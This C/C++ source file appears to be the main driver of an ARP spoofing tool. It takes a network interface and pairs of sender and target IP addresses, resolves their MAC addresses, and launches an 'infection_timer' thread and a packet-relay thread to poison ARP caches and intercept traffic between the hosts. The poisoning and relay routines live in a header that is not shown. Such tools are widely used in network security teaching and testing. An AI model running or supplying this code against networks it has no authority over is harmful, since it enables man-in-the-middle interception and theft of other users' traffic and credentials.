#include "arp_spoof.h"

uint8_t my_mac[6], my_ip[4];
int session_cnt;
map<uint32_t, uint8_t*> ip2mac;
pcap_t *fp;
vector<session> ip_vector;

void usage() {
	printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char * argv[]) {
	if (argc < 4 || argc % 2) {
		usage();
		return -1;
	}
	session_cnt = argc / 2 - 1;
	char * interface = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	const u_char *packet;
	pthread_t thread1, thread2;
	struct pcap_pkthdr * header;	
	fp = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (fp == NULL) {
		printf("ERROR3\n");
		exit(1);
	}
	get_my_ip(interface);
	get_my_mac(interface);
	for(int i = 0; i < session_cnt; i++) {
		session tmp;
		tmp.sender_ip = inet_addr(argv[i * 2 + 2]);
		if(ip2mac.find(tmp.sender_ip) == ip2mac.end()) {
			ip2mac.insert({tmp.sender_ip, (uint8_t *)malloc(6)});
			get_mac(ip2mac[tmp.sender_ip], (uint8_t *)&tmp.sender_ip);
		}
		tmp.target_ip = inet_addr(argv[i * 2 + 3]);
		if(ip2mac.find(tmp.target_ip) == ip2mac.end()) {
			ip2mac.insert({tmp.target_ip, (uint8_t *)malloc(6)});
			get_mac(ip2mac[tmp.target_ip], (uint8_t *)&tmp.target_ip);
		}
		ip_vector.push_back(tmp);
	}
	pthread_create(&thread1, NULL, infection_timer, NULL);
	pthread_create(&thread2, NULL, pkt_loop_thread, NULL);
	pthread_join(thread1, NULL);
	pthread_join(thread2, NULL);
	pcap_close(fp);
	return 0;
}
